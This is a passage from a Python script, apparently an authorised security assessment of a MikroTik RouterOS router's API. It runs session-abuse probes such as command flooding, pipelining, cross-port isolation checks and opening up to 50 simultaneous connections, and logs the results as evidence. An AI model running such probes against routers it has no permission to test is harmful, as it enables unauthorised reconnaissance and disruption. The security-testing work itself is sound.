        ok, _ = api_login(s, ADMIN_USER, ADMIN_PASS)
        if ok:
            # Send two commands with same tag
            send_sentence(s, ["/system/resource/print", ".tag=42"])
            send_sentence(s, ["/system/identity/print", ".tag=42"])
            replies = recv_all_sentences(s, timeout=5)
            reply_text = sentence_summary(replies)
            ev.add_test(cat, "tag_collision",
                        "Two commands with same .tag=42",
                        f"{len(replies)} replies: {reply_text[:100]}",
                        details={"reply_count": len(replies)})
        safe_close(s)
    except Exception as e:
        ev.add_test(cat, "tag_collision",
                    "Tag collision test", f"error: {e}")

    health_gate(ev)

    # ── 7.9  Async listen then flood ─────────────────────────────────────────
    try:
        s = raw_connect(8728, timeout=5)
        ok, _ = api_login(s, ADMIN_USER, ADMIN_PASS)
        if ok:
            # Start a listen command
            send_sentence(s, ["/interface/listen", ".tag=listen1"])
            time.sleep(0.5)
            # Flood with other commands
            for i in range(20):
                send_sentence(s, ["/system/identity/print", f".tag=flood{i}"])
            time.sleep(2)
            replies = recv_all_sentences(s, timeout=3, max_sentences=50)
            # Cancel listen
            send_sentence(s, ["/cancel", "=tag=listen1"])
            time.sleep(0.5)

            ev.add_test(cat, "listen_then_flood",
                        "Start /interface/listen then flood 20 commands",
                        f"{len(replies)} replies received",
                        details={"reply_count": len(replies)})
        safe_close(s)
    except Exception as e:
        ev.add_test(cat, "listen_then_flood",
                    "Listen + flood test", f"error: {e}")

    # ── 7.10  /quit behavior ─────────────────────────────────────────────────
    try:
        s = raw_connect(8728, timeout=5)
        ok, _ = api_login(s, ADMIN_USER, ADMIN_PASS)
        if ok:
            send_sentence(s, ["/quit"])
            time.sleep(1)
            # Try sending another command
            try:
                send_sentence(s, ["/system/identity/print"])
                resp = recv_sentence(s, timeout=3)
                ev.add_test(cat, "quit_then_command",
                            "Send /quit then try another command",
                            f"response: {words_summary(resp)}",
                            details={"post_quit_response": words_summary(resp)})
            except (BrokenPipeError, ConnectionError):
                ev.add_test(cat, "quit_then_command",
                            "Send /quit then try another command",
                            "connection_closed (expected)")
            except:
                ev.add_test(cat, "quit_then_command",
                            "/quit behavior",
                            "error_after_quit")
        safe_close(s)
    except Exception as e:
        ev.add_test(cat, "quit_then_command",
                    "/quit test", f"error: {e}")

    # ── 7.11  Login with wrong user, then correct user (session isolation) ───
    try:
        s = raw_connect(8728, timeout=5)
        ok1, resp1 = api_login(s, "nonexistent_user", "badpass")
        ok2, resp2 = api_login(s, ADMIN_USER, ADMIN_PASS)
        if ok2:
            replies = api_command(s, "/system/identity/print", timeout=3)
            reply_text = sentence_summary(replies)
            ev.add_test(cat, "failed_then_valid_login",
                        "Failed login (bad user), then valid admin login on same socket",
                        f"second_login={'ok' if ok2 else 'fail'}, "
                        f"command: {reply_text[:80]}",
                        details={"first_response": words_summary(resp1),
                                 "second_response": words_summary(resp2)})
        else:
            ev.add_test(cat, "failed_then_valid_login",
                        "Failed then valid login",
                        f"second login failed: {words_summary(resp2)}")
        safe_close(s)
    except Exception as e:
        ev.add_test(cat, "failed_then_valid_login",
                    "Failed then valid login", f"error: {e}")

    # ── 7.12  Pipelining: multiple commands without reading replies ──────────
    try:
        s = raw_connect(8728, timeout=5)
        ok, _ = api_login(s, ADMIN_USER, ADMIN_PASS)
        if ok:
            # Send 10 commands without reading any replies
            for i in range(10):
                send_sentence(s, ["/system/identity/print", f".tag=pipe{i}"])
            # Now read all replies
            replies = recv_all_sentences(s, timeout=5, max_sentences=30)
            ev.add_test(cat, "pipelining_10_commands",
                        "Pipeline 10 commands then read all replies",
                        f"{len(replies)} replies received",
                        details={"reply_count": len(replies)})
        safe_close(s)
    except Exception as e:
        ev.add_test(cat, "pipelining_10_commands",
                    "Pipelining test", f"error: {e}")

    # ── 7.13  SSL session vs plaintext session isolation ─────────────────────
    try:
        # Login on plaintext, try command on SSL (separate connections)
        s1 = raw_connect(8728, timeout=5)
        ok1, _ = api_login(s1, ADMIN_USER, ADMIN_PASS)
        safe_close(s1)

        s2 = raw_connect_ssl(8729, timeout=5)
        # Try command without login on SSL socket
        replies = api_command(s2, "/system/identity/print", timeout=3)
        reply_text = sentence_summary(replies)
        got_data = any(r[0] == '!re' for r in replies if r)
        ev.add_test(cat, "cross_port_session_isolation",
                    "Login on 8728, then try command on 8729 without auth",
                    "DATA_LEAKED" if got_data else f"isolated: {reply_text[:80]}",
                    anomaly=got_data)
        safe_close(s2)
    except Exception as e:
        ev.add_test(cat, "cross_port_session_isolation",
                    "Cross-port session isolation", f"error: {e}")

    # ── 7.14  Connection with zero recv window (TCP layer) ───────────────────
    try:
        s = raw_connect(8728, timeout=5)
        ok, _ = api_login(s, ADMIN_USER, ADMIN_PASS)
        if ok:
            # Set recv buffer very small to create back-pressure
            s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1)
            # Issue a command that returns large output
            send_sentence(s, ["/log/print"])
            time.sleep(3)
            # Now try to read
            try:
                data = b''
                while True:
                    chunk = s.recv(4096)
                    if not chunk:
                        break
                    data += chunk
                    if len(data) > 65536:
                        break
                ev.add_test(cat, "small_recv_buffer",
                            "Set SO_RCVBUF=1 then request /log/print",
                            f"received {len(data)} bytes",
                            details={"bytes_received": len(data)})
            except socket.timeout:
                ev.add_test(cat, "small_recv_buffer",
                            "Small recv buffer test", "timeout")
        safe_close(s)
    except Exception as e:
        ev.add_test(cat, "small_recv_buffer",
                    "Small recv buffer test", f"error: {e}")

    health_gate(ev)

    # ── 7.15  Idle timeout detection ─────────────────────────────────────────
    try:
        s = raw_connect(8728, timeout=35)
        ok, _ = api_login(s, ADMIN_USER, ADMIN_PASS)
        if ok:
            # Wait 30 seconds idle, then send command
            log("    Waiting 30s to test idle timeout...")
            time.sleep(30)
            try:
                replies = api_command(s, "/system/identity/print", timeout=5)
                alive = bool(replies)
                ev.add_test(cat, "idle_timeout_30s",
                            "Login, wait 30 seconds idle, then send command",
                            f"session_alive={alive}",
                            details={"response": sentence_summary(replies)})
            except:
                ev.add_test(cat, "idle_timeout_30s",
                            "Idle timeout test",
                            "session_expired")
        safe_close(s)
    except Exception as e:
        ev.add_test(cat, "idle_timeout_30s",
                    "Idle timeout test", f"error: {e}")

    # ── 7.16  Max concurrent connections ─────────────────────────────────────
    try:
        sockets = []
        max_conns = 0
        for i in range(50):
            try:
                s = raw_connect(8728, timeout=2)
                sockets.append(s)
                max_conns = i + 1
            except:
                break
        ev.add_test(cat, "max_concurrent_connections",
                    "Open as many TCP connections as possible to API port",
                    f"{max_conns} connections accepted",
                    details={"max_connections": max_conns},
                    anomaly=max_conns >= 50)
        for s in sockets:
            safe_close(s)
    except Exception as e:
        ev.add_test(cat, "max_concurrent_connections",
                    "Max connections test", f"error: {e}")

    # ── 7.17  Double sentence terminator ─────────────────────────────────────
    try:
        s = raw_connect(8728, timeout=5)
        ok, _ = api_login(s, ADMIN_USER, ADMIN_PASS)
        if ok:
            # Send command followed by two terminators
            data = encode_word("/system/identity/print") + b'\x00\x00'
            s.sendall(data)
            replies = recv_all_sentences(s, timeout=3)
            ev.add_test(cat, "double_terminator",
                        "Command followed by two 0x00 terminators",
                        f"{len(replies)} replies",
                        details={"response": sentence_summary(replies)})
        safe_close(s)
    except Exception as e:
        ev.add_test(cat, "double_terminator",
                    "Double terminator test", f"error: {e}")

    # ── 7.18  Extremely long-lived session with many commands ────────────────
    try:
        s = raw_connect(8728, timeout=10)
        ok, _ = api_login(s, ADMIN_USER, ADMIN_PASS)
        if ok:
            success_count = 0
            for i in range(50):
                try:
                    replies = api_command(s, "/system/identity/print", timeout=3)
                    if replies:
                        success_count += 1
                except:
                    break
            ev.add_test(cat, "long_session_50_commands",
                        "50 sequential commands on single authenticated session",
                        f"{success_count}/50 succeeded",
                        details={"successes": success_count})
        safe_close(s)
    except Exception as e:
        ev.add_test(cat, "long_session_50_commands",
                    "Long session test", f"error: {e}")


# ══════════════════════════════════════════════════════════════════════════════
#  Main
# ══════════════════════════════════════════════════════════════════════════════

def main():
    log("=" * 60)
    log("MikroTik RouterOS CHR 7.20.8 — RouterOS API Security Assessment")
    log(f"Target: {TARGET}  |  API: 8728  |  API-SSL: 8729")
    log(f"Phase: 4  |  Date: {datetime.now().isoformat()}")
    log("=" * 60)

    # Pre-flight: verify router is alive and API port is open
    status = check_router_alive()
    if not status.get("alive"):
        log("FATAL: Router is not responding. Aborting.")
        sys.exit(1)
    log(f"Router alive: version={status.get('version')}, "
        f"uptime={status.get('uptime')}")

    # Verify API port reachable
    try:
        s = raw_connect(8728, timeout=5)
        safe_close(s)
        log("API port 8728: reachable")
    except Exception as e:
        log(f"FATAL: API port 8728 not reachable: {e}")
        sys.exit(1)

    ev = EvidenceCollector("attack_ros_api.py", phase=4)

    try:
        test_protocol_implementation(ev)
        test_authentication_attacks(ev)
        test_command_injection(ev)
        test_protocol_level_attacks(ev)
        test_preauth_commands(ev)
        test_postauth_privilege(ev)
        test_session_abuse(ev)
    except KeyboardInterrupt:
        log("\nInterrupted by user.")
    except Exception as e:
        log(f"Unhandled exception: {e}")
        import traceback
        traceback.print_exc()
    finally:
        ev.save("ros_api_attacks.json")
        ev.summary()

    log("Done.")


if __name__ == "__main__":
    main()
